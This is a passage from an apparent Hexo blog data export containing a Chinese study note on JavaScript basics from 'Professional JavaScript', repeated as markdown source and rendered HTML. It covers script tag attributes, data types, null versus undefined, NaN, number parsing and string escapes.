Boolean()函数，作为if条件，都会自动转换为Boolean值，转换为false的值：null、undefined、\"\"、0和NaN、\n2. 八进制在严格模式下失效，会报错，十六进制以'0x'开头\n3. `1.`和`1.0`都会被解析成1，浮点数计算不准，不能作为判断条件例如0.1+0.2并不等于0.3\n4. 科学计数法3.123e7\n5. `Number.MIN_VALUE>0`是最接近0的正数，isFinite(Number.MAX_VALUE)，Infinity也是一个number\n6. `typeof -Infinity //'number'`\n\n### 1.NaN ###\n\n1. NaN，即非数值（Not a Number）是一个特殊的数值，这个数值用于表示一个本来要返回数值的操作数未返回数值的情况（这样就不会抛出错误了）。\n2. `0/0 = NaN; 1/0 = Infinity; -1/0 = -Infinity`\n3. NaN的两个特性：\n\n- 任何涉及NaN的计算，结果都是NaN\n- NaN与谁都不相等，`NaN==NaN;//false`\n4. isNaN() \n\n- 可以转化为数值的返回false，包括：null（转化为0），boolean，number类型（不含NaN）,\"\",\"10\";\n- 不可以转化为数值的返回true，包括：undefined，NaN，Object，\"10aa\"\n\n### 2. 数值转换Number、parseFloat、parseInt ###\n三种方法:\n\n1. Nubmer()适用于各种数据类型，但是字符串转换规则比较复杂，所以 **Number一般用来转换除字符串的其他类型**\n2. **parseFloat和parseInt专门用于字符串转数值**，转换非字符串类型时，都返回NaN\n3.parseInt转换字符串的规则是:**查看字符串第一位非空格值，如果是数字或者负号，结果就是数值，否则就是NaN**，所以`parseInt(\"\") = NaN`\n\n- parseInt('22.5')=22,因为小数点不是有效数字字符\n- 第一个字符是数字，那么可以识别以0开头后跟数字的八进制和0x开头后跟数字的16进制：\n```\nparseInt('070')=70; \nparseInt('070',8) = 56; \nparseInt('0x11') = 17; \nparseInt('1f') = 1; \nparseInt('1f',16)=31\n```\n- **建议`parseInt`无论在什么情况下都明确指定基数**:`parseInt('070',10)`\n\n4. parseFloat也是从首个非空格字符开始解析，直到第二个小数点，后面的都忽略，与parseIn的区别：\n\n- 首个小数点有效，但是小数点后都是0，将解析为整数\n- 只能解析十进制，首位0都忽略\n\n## 3.4 String ##\n\n1. 字符字面量，又叫转义序列: `\\ntbrf, \\\\, \\', \\\",  \\xnn, \\unnnn`\n \n- '\\xnn'以16进制代码表示一个字符，\"\\x41\" 输出结果为\"A\"\n- '\\unnnn'16进制代码表示一个unicode字符，为unicode码，'\\u7530'输出结果为汉字\"田\"\n2. string的length属性，在计算包含双字节字符时可能会不准，\n \n- 字节知识：最小单位为bit比特/位，8bit = 1byte 字节，英文字母单字节8bit，汉字双字节16bit\n\n3. 字符串不可变，改变一个字符串值，就是销毁重建一个，IE6-效率很低\n4. 除了null和undefined，其他数据类型都有toString()方法，数值的toString方法有参数，2、8、10、16，表示转成什么进制表示的字符串\n```\nvar num = 2;\nconsole.log(num.toString(2)); //'10'\nconsole.log(NaN.toString()); //'NaN'\n```\n但是不能写作：`2.toString(2)`，会报错\n5. 比toString()更包容的String(), 也可以把null和undefined转换为字符串，`String(null)=\"null\"; String(070)=\"56\"; String(0x1f)=\"31\"`\n6. 转换为字符串还有一种方法：`var b = 1+\"\"; var a = null + \"\";`\n\n\n\n\n---\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript2](http://luckymona.github.io/2016/09/17/read-book-professional-javascript2)\n\nReference：\n\n^1:[undefined与null的区别](http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html)\n\n\n\n\n\n","source":"_posts/read-book-professional-javascript2.md","raw":"---\ntitle: Javascript基础2\ndate: 2016-09-17 15:00:00\ncategories: Javascript\ntags: [Javascript,红皮书,读书笔记] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n摘要：\n\n1. `<script>`的属性defer、async、src、type\n2. MINE类型、load事件、DOMContentLoaded事件\n3. 文档模式\n4. 报错\"Identifier Expected\"是因为标识符命名使用了关键字\n5. 用var定义变量和省略var造成的影响\n6. 5种基本数据类型，一种复杂数据类型，使用typeof分别返回什么值\n7. null和undefined的区别和联系，各自的使用场景，二者相等(==)，分别使用Number()和parseInt/parseFloat得到的值\n8. typeof可以使用未定义变量而不报错\n9. 会转换为false的五个值\n10. NaN的两个特性，isNaN函数判断是不是可以转换为数字\n11. 使用时一般用Number方法转换除string外的值，parseInt/parseFloat只能解析string值\n12. parseInt/parseFloat解析字符串规则是，第一位非空格值必须是数字，否则结果就是NaN\n13. 使用parseInt最好指明进制，parseInt('070',10)\n14. parseFloat只能解析十进制\n15. string字符字面量、转义序列，\\ntrbf,`\\\\` ,\\\",\\',\\xnn,\\unnnn\n16. string的length对双字节字符不准\n17. null和undefined没有toString()方法，所有类型都有String()方法\n18. number类型的toString()方法，可以传参，2、8、10、16，代表进制\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript2](http://luckymona.github.io/2016/09/17/read-book-professional-javascript2)\n\n# 一、使用Javascript #\n\n## 1.使用Javascript的两种方式 ##\n使用`<script>`内嵌或者引入外部脚本文件，不能既内嵌又引入，例如这样：\n```\n<script src=\"xxx.js\">\nconsole.log('js');\n</script\n```\n此时浏览器不解析内嵌的JS代码，只解析引入的代码。\n最佳实践是使用外部文件，而非嵌入，优点有：易维护、可缓存（同一个文件可以多除引用）、适应未来\n## 2.`<script>`标签的常用属性有：src, defer, async,type ##\n\n- type, 描述引入文件的MIME类型\n- src，有src属性的标签都可以跨域，这样的标签有`<script>`, `<img>`,`<iframe>`\n- defer, 只能在外部脚本文件上使用，表示延迟到文档完全被解析和显示后再加载，照HTML5规定，会在DOMContentLoaded事件触发前执行(浏览器实现不一定会在此之前执行)，即遇到`</html>`标签在执行，用法：`<script defer scr=\"xx.js\"></script>`\n- async，HTML5定义的属性，只能在外部脚本文件上使用，表示开始执行JS脚本，但是不阻塞后面脚本的执行。标记为async的多个`<script>`标签，并不一定按照前后顺序执行。async脚本一定会在load事件之前执行，但可能会在DOMContentLoaded事件触发之前或之后执行\n\n把`<script>`引入文件放在body标签的最后，防止阻塞页面展现\n\n**MIME：**定义数据格式，前面是数据的大类型，后面是具体类型，如text/html、img/gif等\n**load事件：**在页面中的一切都加载完毕时触发，包括JS脚本、CSS、图片等\n**DOMContentLoaded事件：**DOM节点树映射完成时触发，高程P408\n\n## 3.文档模式 ##\n通过DOCTYPE区分文档模式，分为混杂模式、标准模式和准标准模式，混杂模式会让IE表现出与IE5相同的行为，如果不加DOCTYPE会让浏览器按混杂模式解析。标准模式和准标准模式有很小的差别，**标准模式**(不探讨XHTML)：\n```\n<!-- HTML 4.01 严格型 -->\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n\"http://www.w3.org/TR/html4/strict.dtd\">\n\n<!-- HTML 5 -->\n<!DOCTYPE html>\n```\n**准标准模式**：\n```\n<!-- HTML 4.01 过渡型 -->\n<!DOCTYPE HTML PUBLIC\n\"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n\n<!-- HTML 4.01 框架集型 -->\n<!DOCTYPE HTML PUBLIC\n\"-//W3C//DTD HTML 4.01 Frameset//EN\"\n\"http://www.w3.org/TR/html4/frameset.dtd\">\n```\n现在一般使用html5的DOCTYPE声明\n\n# 二、基本概念 #\n\n1. JS中的一切都 **区分大小写**\n2. 标识符的第一位可以是字母、下划线、美元符$: aa、 _a、 $a；还可以是中文，但是不推荐\n3. 严格模式`use strict`，IE10+\n4. 关键字和保留字都不能做标识符，关键字做，会报错 **\"Identifier Expected\"**\n5. JS中的变量是松散类型的，也就是可以保存任何类型，**变量只是一个占位符**\n6. **用var定义的变量，会成为所在作用域的局部变量**，与外界无关，当函数运行完毕，会被销毁![var](http://o798x2hdw.bkt.clouddn.com/var.png)\n7. **在函数中省略var，会创建一个全局变量**，非常不建议这样做，因为在局部作用域定义的全局变量很难维护\n\n# 三、数据类型 #\n这一部分在if else控制流程时很重要的。\n\nJS中共6种数据类型，5种基本(简单)数据类型：Null、Undefined、String、Number、Boolean\n1种复杂数据类型：Object\n\n## 3.1检测数据类型使用typeof ##\n对应的可以检测出来的值有：还是六种类型，null会被检测为\"object\", function不是一种数据类型，但是会被检测为\"function\"\n|  数据类型 | typeof 检测值 |\n|-----------|---------------|\n| null      | \"object\"      |\n| undefined | \"undefined\"   |\n| string    | \"string\"      |\n| number    | \"number\"      |\n| boolean   | \"boolean\"     |\n| object    | \"object\" / \"function\" |\n例外:正则表达式，在Safari 5和Chrome 7前版本浏览器中，typeof值为\"function\"，新版本为\"object\"\n\n## 3.2 null与undefined区别 ##\n### 1. undefined ###\n\n1. 定义：已经定义但没有赋值，即没有初始化的变量 `var a; // a === undefined`\n2. 没必要显式赋值，变量未初始化时默认是undefined\n3. 使用场景：\n\n - `var a`定义变量而不初始化，默认值为undefined\n - `if (a=== undefined)`流程控制时做判断条件\n - 对象属性没有赋值，默认值为`undefined`^1\n`var a={bb:\"xx\"}; console.log(a.aa); `\n - 函数不显式定义返回值，默认返回`undefined`\n```\nfunction aa(){\n    var a=1;\n    a++;\n}\nconsole.log(aa()); // undefined\n```\n - 调用函数时，该提供的参数没有提供，参数值默认为`undefined`\n ```\n function aa(bb){\n            console.log(bb);\n        }\n        aa();\n ```\n\n### 2.null ###\n\n1. 定义: 空对象指针\n2. 应该显式赋值  初始化一个未来保存object变量时，初始化为null\n3. 使用场景：\n\n- 作为对象初始化的值`var timer = null;`\n- 作为函数的参数，表示该函数的参数不是对象（这一条的用法不是很理解，谁知道吗？告诉我一下）\n- null不是对象，但是是对象原型链的终点`Object.prototype.__proto__； // null`而null没有prototype；\n- `var dom = document.getElementById('domId');`如果domId不存在，dom变量为null\n\n### 3. 其他 ###\n1.  undefined 值是派生自 null 值的，所以`null == undefined；//true`但是`null === undefined //false`\n2. `Number(undefined) = NaN; Number(null) = 0`，但是使用parseInt和parseFloat都是NaN\n3. \n```\nvar aa;\nconsole.log(aa); //undefined\nconsole.log(bb); // 报错\nconsole.log(typeof bb) //undefined\n```\n\n## 3.3 Number类型 ##\n1. Boolean()函数，作为if条件，都会自动转换为Boolean值，转换为false的值：null、undefined、\"\"、0和NaN、\n2. 八进制在严格模式下失效，会报错，十六进制以'0x'开头\n3. `1.`和`1.0`都会被解析成1，浮点数计算不准，不能作为判断条件例如0.1+0.2并不等于0.3\n4. 科学计数法3.123e7\n5. `Number.MIN_VALUE>0`是最接近0的正数，isFinite(Number.MAX_VALUE)，Infinity也是一个number\n6. `typeof -Infinity //'number'`\n\n### 1.NaN ###\n\n1. NaN，即非数值（Not a Number）是一个特殊的数值，这个数值用于表示一个本来要返回数值的操作数未返回数值的情况（这样就不会抛出错误了）。\n2. `0/0 = NaN; 1/0 = Infinity; -1/0 = -Infinity`\n3. NaN的两个特性：\n\n- 任何涉及NaN的计算，结果都是NaN\n- NaN与谁都不相等，`NaN==NaN;//false`\n4. isNaN() \n\n- 可以转化为数值的返回false，包括：null（转化为0），boolean，number类型（不含NaN）,\"\",\"10\";\n- 不可以转化为数值的返回true，包括：undefined，NaN，Object，\"10aa\"\n\n### 2. 数值转换Number、parseFloat、parseInt ###\n三种方法:\n\n1. Nubmer()适用于各种数据类型，但是字符串转换规则比较复杂，所以 **Number一般用来转换除字符串的其他类型**\n2. **parseFloat和parseInt专门用于字符串转数值**，转换非字符串类型时，都返回NaN\n3.parseInt转换字符串的规则是:**查看字符串第一位非空格值，如果是数字或者负号，结果就是数值，否则就是NaN**，所以`parseInt(\"\") = NaN`\n\n- parseInt('22.5')=22,因为小数点不是有效数字字符\n- 第一个字符是数字，那么可以识别以0开头后跟数字的八进制和0x开头后跟数字的16进制：\n```\nparseInt('070')=70; \nparseInt('070',8) = 56; \nparseInt('0x11') = 17; \nparseInt('1f') = 1; \nparseInt('1f',16)=31\n```\n- **建议`parseInt`无论在什么情况下都明确指定基数**:`parseInt('070',10)`\n\n4. parseFloat也是从首个非空格字符开始解析，直到第二个小数点，后面的都忽略，与parseIn的区别：\n\n- 首个小数点有效，但是小数点后都是0，将解析为整数\n- 只能解析十进制，首位0都忽略\n\n## 3.4 String ##\n\n1. 字符字面量，又叫转义序列: `\\ntbrf, \\\\, \\', \\\",  \\xnn, \\unnnn`\n \n- '\\xnn'以16进制代码表示一个字符，\"\\x41\" 输出结果为\"A\"\n- '\\unnnn'16进制代码表示一个unicode字符，为unicode码，'\\u7530'输出结果为汉字\"田\"\n2. string的length属性，在计算包含双字节字符时可能会不准，\n \n- 字节知识：最小单位为bit比特/位，8bit = 1byte 字节，英文字母单字节8bit，汉字双字节16bit\n\n3. 字符串不可变，改变一个字符串值，就是销毁重建一个，IE6-效率很低\n4. 除了null和undefined，其他数据类型都有toString()方法，数值的toString方法有参数，2、8、10、16，表示转成什么进制表示的字符串\n```\nvar num = 2;\nconsole.log(num.toString(2)); //'10'\nconsole.log(NaN.toString()); //'NaN'\n```\n但是不能写作：`2.toString(2)`，会报错\n5. 比toString()更包容的String(), 也可以把null和undefined转换为字符串，`String(null)=\"null\"; String(070)=\"56\"; String(0x1f)=\"31\"`\n6. 转换为字符串还有一种方法：`var b = 1+\"\"; var a = null + \"\";`\n\n\n\n\n---\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript2](http://luckymona.github.io/2016/09/17/read-book-professional-javascript2)\n\nReference：\n\n^1:[undefined与null的区别](http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html)\n\n\n\n\n\n","slug":"read-book-professional-javascript2","published":1,"updated":"2018-05-07T10:29:59.600Z","layout":"post","photos":[],"link":"","_id":"cjgw4449r00278d95qhvpkvdm","content":"<p>摘要：</p>\n<ol>\n<li><code>&lt;script&gt;</code>的属性defer、async、src、type</li>\n<li>MINE类型、load事件、DOMContentLoaded事件</li>\n<li>文档模式</li>\n<li>报错”Identifier Expected”是因为标识符命名使用了关键字</li>\n<li>用var定义变量和省略var造成的影响</li>\n<li>5种基本数据类型，一种复杂数据类型，使用typeof分别返回什么值</li>\n<li>null和undefined的区别和联系，各自的使用场景，二者相等(==)，分别使用Number()和parseInt/parseFloat得到的值</li>\n<li>typeof可以使用未定义变量而不报错</li>\n<li>会转换为false的五个值</li>\n<li>NaN的两个特性，isNaN函数判断是不是可以转换为数字</li>\n<li>使用时一般用Number方法转换除string外的值，parseInt/parseFloat只能解析string值</li>\n<li>parseInt/parseFloat解析字符串规则是，第一位非空格值必须是数字，否则结果就是NaN</li>\n<li>使用parseInt最好指明进制，parseInt(‘070’,10)</li>\n<li>parseFloat只能解析十进制</li>\n<li>string字符字面量、转义序列，\\ntrbf,<code>\\\\</code> ,\\”,\\’,\\xnn,\\unnnn</li>\n<li>string的length对双字节字符不准</li>\n<li>null和undefined没有toString()方法，所有类型都有String()方法</li>\n<li>number类型的toString()方法，可以传参，2、8、10、16，代表进制</li>\n</ol>\n<a id=\"more\"></a>\n<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/17/read-book-professional-javascript2\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/17/read-book-professional-javascript2</a></p>\n</blockquote>\n<h1 id=\"一、使用Javascript\"><a href=\"#一、使用Javascript\" class=\"headerlink\" title=\"一、使用Javascript\"></a>一、使用Javascript</h1><h2 id=\"1-使用Javascript的两种方式\"><a href=\"#1-使用Javascript的两种方式\" class=\"headerlink\" title=\"1.使用Javascript的两种方式\"></a>1.使用Javascript的两种方式</h2><p>使用<code>&lt;script&gt;</code>内嵌或者引入外部脚本文件，不能既内嵌又引入，例如这样：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;xxx.js&quot;&gt;</span><br><span class=\"line\">console.log(&apos;js&apos;);</span><br><span class=\"line\">&lt;/script</span><br></pre></td></tr></table></figure></p>\n<p>此时浏览器不解析内嵌的JS代码，只解析引入的代码。<br>最佳实践是使用外部文件，而非嵌入，优点有：易维护、可缓存（同一个文件可以多除引用）、适应未来</p>\n<h2 id=\"2-lt-script-gt-标签的常用属性有：src-defer-async-type\"><a href=\"#2-lt-script-gt-标签的常用属性有：src-defer-async-type\" class=\"headerlink\" title=\"2.&lt;script&gt;标签的常用属性有：src, defer, async,type\"></a>2.<code>&lt;script&gt;</code>标签的常用属性有：src, defer, async,type</h2><ul>\n<li>type, 描述引入文件的MIME类型</li>\n<li>src，有src属性的标签都可以跨域，这样的标签有<code>&lt;script&gt;</code>, <code>&lt;img&gt;</code>,<code>&lt;iframe&gt;</code></li>\n<li>defer, 只能在外部脚本文件上使用，表示延迟到文档完全被解析和显示后再加载，照HTML5规定，会在DOMContentLoaded事件触发前执行(浏览器实现不一定会在此之前执行)，即遇到<code>&lt;/html&gt;</code>标签在执行，用法：<code>&lt;script defer scr=&quot;xx.js&quot;&gt;&lt;/script&gt;</code></li>\n<li>async，HTML5定义的属性，只能在外部脚本文件上使用，表示开始执行JS脚本，但是不阻塞后面脚本的执行。标记为async的多个<code>&lt;script&gt;</code>标签，并不一定按照前后顺序执行。async脚本一定会在load事件之前执行，但可能会在DOMContentLoaded事件触发之前或之后执行</li>\n</ul>\n<p>把<code>&lt;script&gt;</code>引入文件放在body标签的最后，防止阻塞页面展现</p>\n<p><strong>MIME：</strong>定义数据格式，前面是数据的大类型，后面是具体类型，如text/html、img/gif等<br><strong>load事件：</strong>在页面中的一切都加载完毕时触发，包括JS脚本、CSS、图片等<br><strong>DOMContentLoaded事件：</strong>DOM节点树映射完成时触发，高程P408</p>\n<h2 id=\"3-文档模式\"><a href=\"#3-文档模式\" class=\"headerlink\" title=\"3.文档模式\"></a>3.文档模式</h2><p>通过DOCTYPE区分文档模式，分为混杂模式、标准模式和准标准模式，混杂模式会让IE表现出与IE5相同的行为，如果不加DOCTYPE会让浏览器按混杂模式解析。标准模式和准标准模式有很小的差别，<strong>标准模式</strong>(不探讨XHTML)：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML 4.01 严格型 --&gt;</span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br><span class=\"line\">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- HTML 5 --&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong>准标准模式</strong>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML 4.01 过渡型 --&gt;</span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC</span><br><span class=\"line\">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span><br><span class=\"line\">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- HTML 4.01 框架集型 --&gt;</span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC</span><br><span class=\"line\">&quot;-//W3C//DTD HTML 4.01 Frameset//EN&quot;</span><br><span class=\"line\">&quot;http://www.w3.org/TR/html4/frameset.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></p>\n<p>现在一般使用html5的DOCTYPE声明</p>\n<h1 id=\"二、基本概念\"><a href=\"#二、基本概念\" class=\"headerlink\" title=\"二、基本概念\"></a>二、基本概念</h1><ol>\n<li>JS中的一切都 <strong>区分大小写</strong></li>\n<li>标识符的第一位可以是字母、下划线、美元符$: aa、 _a、 $a；还可以是中文，但是不推荐</li>\n<li>严格模式<code>use strict</code>，IE10+</li>\n<li>关键字和保留字都不能做标识符，关键字做，会报错 <strong>“Identifier Expected”</strong></li>\n<li>JS中的变量是松散类型的，也就是可以保存任何类型，<strong>变量只是一个占位符</strong></li>\n<li><strong>用var定义的变量，会成为所在作用域的局部变量</strong>，与外界无关，当函数运行完毕，会被销毁<img src=\"http://o798x2hdw.bkt.clouddn.com/var.png\" alt=\"var\"></li>\n<li><strong>在函数中省略var，会创建一个全局变量</strong>，非常不建议这样做，因为在局部作用域定义的全局变量很难维护</li>\n</ol>\n<h1 id=\"三、数据类型\"><a href=\"#三、数据类型\" class=\"headerlink\" title=\"三、数据类型\"></a>三、数据类型</h1><p>这一部分在if else控制流程时很重要的。</p>\n<p>JS中共6种数据类型，5种基本(简单)数据类型：Null、Undefined、String、Number、Boolean<br>1种复杂数据类型：Object</p>\n<h2 id=\"3-1检测数据类型使用typeof\"><a href=\"#3-1检测数据类型使用typeof\" class=\"headerlink\" title=\"3.1检测数据类型使用typeof\"></a>3.1检测数据类型使用typeof</h2><p>对应的可以检测出来的值有：还是六种类型，null会被检测为”object”, function不是一种数据类型，但是会被检测为”function”<br>|  数据类型 | typeof 检测值 |<br>|———–|—————|<br>| null      | “object”      |<br>| undefined | “undefined”   |<br>| string    | “string”      |<br>| number    | “number”      |<br>| boolean   | “boolean”     |<br>| object    | “object” / “function” |<br>例外:正则表达式，在Safari 5和Chrome 7前版本浏览器中，typeof值为”function”，新版本为”object”</p>\n<h2 id=\"3-2-null与undefined区别\"><a href=\"#3-2-null与undefined区别\" class=\"headerlink\" title=\"3.2 null与undefined区别\"></a>3.2 null与undefined区别</h2><h3 id=\"1-undefined\"><a href=\"#1-undefined\" class=\"headerlink\" title=\"1. undefined\"></a>1. undefined</h3><ol>\n<li>定义：已经定义但没有赋值，即没有初始化的变量 <code>var a; // a === undefined</code></li>\n<li>没必要显式赋值，变量未初始化时默认是undefined</li>\n<li><p>使用场景：</p>\n<ul>\n<li><code>var a</code>定义变量而不初始化，默认值为undefined</li>\n<li><code>if (a=== undefined)</code>流程控制时做判断条件</li>\n<li>对象属性没有赋值，默认值为<code>undefined</code>^1<br><code>var a={bb:&quot;xx&quot;}; console.log(a.aa);</code></li>\n<li><p>函数不显式定义返回值，默认返回<code>undefined</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function aa()&#123;</span><br><span class=\"line\">    var a=1;</span><br><span class=\"line\">    a++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(aa()); // undefined</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>调用函数时，该提供的参数没有提供，参数值默认为<code>undefined</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function aa(bb)&#123;</span><br><span class=\"line\">           console.log(bb);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       aa();</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"2-null\"><a href=\"#2-null\" class=\"headerlink\" title=\"2.null\"></a>2.null</h3><ol>\n<li>定义: 空对象指针</li>\n<li>应该显式赋值  初始化一个未来保存object变量时，初始化为null</li>\n<li>使用场景：</li>\n</ol>\n<ul>\n<li>作为对象初始化的值<code>var timer = null;</code></li>\n<li>作为函数的参数，表示该函数的参数不是对象（这一条的用法不是很理解，谁知道吗？告诉我一下）</li>\n<li>null不是对象，但是是对象原型链的终点<code>Object.prototype.__proto__； // null</code>而null没有prototype；</li>\n<li><code>var dom = document.getElementById(&#39;domId&#39;);</code>如果domId不存在，dom变量为null</li>\n</ul>\n<h3 id=\"3-其他\"><a href=\"#3-其他\" class=\"headerlink\" title=\"3. 其他\"></a>3. 其他</h3><ol>\n<li>undefined 值是派生自 null 值的，所以<code>null == undefined；//true</code>但是<code>null === undefined //false</code></li>\n<li><code>Number(undefined) = NaN; Number(null) = 0</code>，但是使用parseInt和parseFloat都是NaN</li>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var aa;</span><br><span class=\"line\">console.log(aa); //undefined</span><br><span class=\"line\">console.log(bb); // 报错</span><br><span class=\"line\">console.log(typeof bb) //undefined</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"3-3-Number类型\"><a href=\"#3-3-Number类型\" class=\"headerlink\" title=\"3.3 Number类型\"></a>3.3 Number类型</h2><ol>\n<li>Boolean()函数，作为if条件，都会自动转换为Boolean值，转换为false的值：null、undefined、””、0和NaN、</li>\n<li>八进制在严格模式下失效，会报错，十六进制以’0x’开头</li>\n<li><code>1.</code>和<code>1.0</code>都会被解析成1，浮点数计算不准，不能作为判断条件例如0.1+0.2并不等于0.3</li>\n<li>科学计数法3.123e7</li>\n<li><code>Number.MIN_VALUE&gt;0</code>是最接近0的正数，isFinite(Number.MAX_VALUE)，Infinity也是一个number</li>\n<li><code>typeof -Infinity //&#39;number&#39;</code></li>\n</ol>\n<h3 id=\"1-NaN\"><a href=\"#1-NaN\" class=\"headerlink\" title=\"1.NaN\"></a>1.NaN</h3><ol>\n<li>NaN，即非数值（Not a Number）是一个特殊的数值，这个数值用于表示一个本来要返回数值的操作数未返回数值的情况（这样就不会抛出错误了）。</li>\n<li><code>0/0 = NaN; 1/0 = Infinity; -1/0 = -Infinity</code></li>\n<li>NaN的两个特性：</li>\n</ol>\n<ul>\n<li>任何涉及NaN的计算，结果都是NaN</li>\n<li>NaN与谁都不相等，<code>NaN==NaN;//false</code></li>\n</ul>\n<ol start=\"4\">\n<li>isNaN() </li>\n</ol>\n<ul>\n<li>可以转化为数值的返回false，包括：null（转化为0），boolean，number类型（不含NaN）,””,”10”;</li>\n<li>不可以转化为数值的返回true，包括：undefined，NaN，Object，”10aa”</li>\n</ul>\n<h3 id=\"2-数值转换Number、parseFloat、parseInt\"><a href=\"#2-数值转换Number、parseFloat、parseInt\" class=\"headerlink\" title=\"2. 数值转换Number、parseFloat、parseInt\"></a>2. 数值转换Number、parseFloat、parseInt</h3><p>三种方法:</p>\n<ol>\n<li>Nubmer()适用于各种数据类型，但是字符串转换规则比较复杂，所以 <strong>Number一般用来转换除字符串的其他类型</strong></li>\n<li><strong>parseFloat和parseInt专门用于字符串转数值</strong>，转换非字符串类型时，都返回NaN<br>3.parseInt转换字符串的规则是:<strong>查看字符串第一位非空格值，如果是数字或者负号，结果就是数值，否则就是NaN</strong>，所以<code>parseInt(&quot;&quot;) = NaN</code></li>\n</ol>\n<ul>\n<li>parseInt(‘22.5’)=22,因为小数点不是有效数字字符</li>\n<li><p>第一个字符是数字，那么可以识别以0开头后跟数字的八进制和0x开头后跟数字的16进制：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parseInt(&apos;070&apos;)=70; </span><br><span class=\"line\">parseInt(&apos;070&apos;,8) = 56; </span><br><span class=\"line\">parseInt(&apos;0x11&apos;) = 17; </span><br><span class=\"line\">parseInt(&apos;1f&apos;) = 1; </span><br><span class=\"line\">parseInt(&apos;1f&apos;,16)=31</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>建议<code>parseInt</code>无论在什么情况下都明确指定基数</strong>:<code>parseInt(&#39;070&#39;,10)</code></p>\n</li>\n</ul>\n<ol start=\"4\">\n<li>parseFloat也是从首个非空格字符开始解析，直到第二个小数点，后面的都忽略，与parseIn的区别：</li>\n</ol>\n<ul>\n<li>首个小数点有效，但是小数点后都是0，将解析为整数</li>\n<li>只能解析十进制，首位0都忽略</li>\n</ul>\n<h2 id=\"3-4-String\"><a href=\"#3-4-String\" class=\"headerlink\" title=\"3.4 String\"></a>3.4 String</h2><ol>\n<li>字符字面量，又叫转义序列: <code>\\ntbrf, \\\\, \\&#39;, \\&quot;,  \\xnn, \\unnnn</code></li>\n</ol>\n<ul>\n<li>‘\\xnn’以16进制代码表示一个字符，”\\x41” 输出结果为”A”</li>\n<li>‘\\unnnn’16进制代码表示一个unicode字符，为unicode码，’\\u7530’输出结果为汉字”田”</li>\n</ul>\n<ol start=\"2\">\n<li>string的length属性，在计算包含双字节字符时可能会不准，</li>\n</ol>\n<ul>\n<li>字节知识：最小单位为bit比特/位，8bit = 1byte 字节，英文字母单字节8bit，汉字双字节16bit</li>\n</ul>\n<ol 